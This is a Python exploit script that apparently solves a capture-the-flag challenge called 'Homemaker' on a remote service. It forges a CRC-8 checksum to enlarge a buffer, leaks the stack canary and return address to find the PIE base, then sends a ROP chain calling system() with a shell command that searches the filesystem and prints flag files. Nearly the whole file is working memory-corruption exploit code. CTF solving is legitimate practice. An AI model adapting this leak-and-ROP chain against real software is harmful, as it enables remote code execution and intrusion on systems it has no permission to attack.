#!/usr/bin/env python3
"""Solve SunshineCTF 2026's Homemaker challenge."""

from __future__ import annotations

import argparse
import re
import socket
import struct

BANNER_SIZE = 0x195
DEFAULT_HOST = "sunshinectf.games"
DEFAULT_PORT = 26008
FLAG_PATTERN = re.compile(rb"sun\{[^}\r\n]{1,120}\}")


def crc8(data: bytes) -> int:
    """CRC-8 used by the card link (initial value 0, polynomial 0x2f)."""
    value = 0
    for byte in data:
        value ^= byte
        for _ in range(8):
            value = ((value << 1) ^ (0x2F if value & 0x80 else 0)) & 0xFF
    return value


def make_card(body: bytes) -> bytes:
    """Wrap one body in the service's ESC-[ card format."""
    if len(body) > 0xFFFF:
        raise ValueError("card body is too long")
    return (
        b"\x1b["
        + len(body).to_bytes(2, "big")
        + body
        + bytes((crc8(body),))
        + b"\x1b\\"
    )


def recv_exact(sock: socket.socket, size: int) -> bytes:
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise EOFError(f"service closed with {len(data)} of {size} bytes received")
        data.extend(chunk)
    return bytes(data)


def recv_frame(sock: socket.socket) -> tuple[int, bytes]:
    header = recv_exact(sock, 4)
    if header[:2] != b"\x1b[":
        raise ValueError(f"unexpected frame header: {header!r}")

    body_size = int.from_bytes(header[2:4], "big")
    tail = recv_exact(sock, body_size + 3)
    body, checksum, end = tail[:body_size], tail[body_size], tail[body_size + 1 :]
    if end != b"\x1b\\":
        raise ValueError(f"unexpected frame ending: {end!r}")
    if crc8(body) != checksum:
        raise ValueError("service frame has an invalid CRC")
    if not body:
        raise ValueError("service frame has no status byte")
    return body[0], body[1:]


def expect_status(sock: socket.socket, expected: int = 0) -> bytes:
    status, data = recv_frame(sock)
    if status != expected:
        raise RuntimeError(f"card returned status {status:#x}, expected {expected:#x}")
    return data


def make_capacity_card() -> bytes:
    """Set the low capacity byte to 0xff through the copied CRC byte."""
    for last_byte in range(256):
        data = bytes(255) + bytes((last_byte,))
        body = b"\x02" + data
        if crc8(body) == 0xFF:
            return make_card(body)
    raise RuntimeError("could not find a card with the required CRC")


def put_qword(buffer: bytearray, offset: int, value: int) -> None:
    struct.pack_into("<Q", buffer, offset, value & ((1 << 64) - 1))


def make_return_card(memory: bytes) -> bytes:
    if len(memory) != 0x1FF:
        raise ValueError(f"expected 511 bytes of memory, received {len(memory)}")

    canary = memory[0x108:0x110]
    saved_rbp = struct.unpack_from("<Q", memory, 0x110)[0]
    saved_return = struct.unpack_from("<Q", memory, 0x118)[0]
    pie_base = saved_return - 0x1A9F
    if pie_base <= 0 or pie_base & 0xFFF:
        raise ValueError(f"unexpected PIE base derived from {saved_return:#x}")

    local_area = saved_rbp - 0x110
    command = b"find / -maxdepth 4 -type f -iname '*flag*' -exec cat {} \\; 2>/dev/null\0"
    if len(command) > 0x7F:
        raise ValueError("command does not fit in the reserved stack area")

    image = bytearray(0x1FF)
    image[0x100:0x102] = b"\xff\x01"  # Keep the capacity at 0x1ff.
    image[0x108:0x110] = canary
    put_qword(image, 0x110, saved_rbp)
    put_qword(image, 0x118, pie_base + 0x12AA)  # pop rdi; ret
    put_qword(image, 0x120, local_area + 0x180)
    put_qword(image, 0x128, pie_base + 0x1158)  # ret; align system's stack
    put_qword(image, 0x130, pie_base + 0x10C0)  # system@plt
    put_qword(image, 0x138, 0)  # Return after the command finishes.
    image[0x180 : 0x180 + len(command)] = command
    return make_card(b"\x02" + image)


def recv_until_close(sock: socket.socket, timeout: float = 8.0) -> bytes:
    result = bytearray()
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            result.extend(chunk)
    except socket.timeout:
        pass
    return bytes(result)


def solve(host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=8.0) as sock:
        sock.settimeout(8.0)
        recv_exact(sock, BANNER_SIZE)

        sock.sendall(make_card(b"\x01\x13\x37\xC3\x5F"))
        expect_status(sock)

        sock.sendall(make_capacity_card())
        expect_status(sock)

        sock.sendall(make_card(b"\x03"))
        status, memory = recv_frame(sock)
        if status != 0:
            raise RuntimeError(f"memory read returned status {status:#x}")

        sock.sendall(make_return_card(memory))
        expect_status(sock)

        # A bad header makes the card loop return through the saved address.
        sock.sendall(b"XXXX")
        expect_status(sock, 0xE1)
        output = recv_until_close(sock)

    match = FLAG_PATTERN.search(output)
    if not match:
        raise RuntimeError(f"no sun{{...}} flag found in service output: {output!r}")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    args = parser.parse_args()
    print(solve(args.host, args.port).decode("ascii"))


if __name__ == "__main__":
    main()

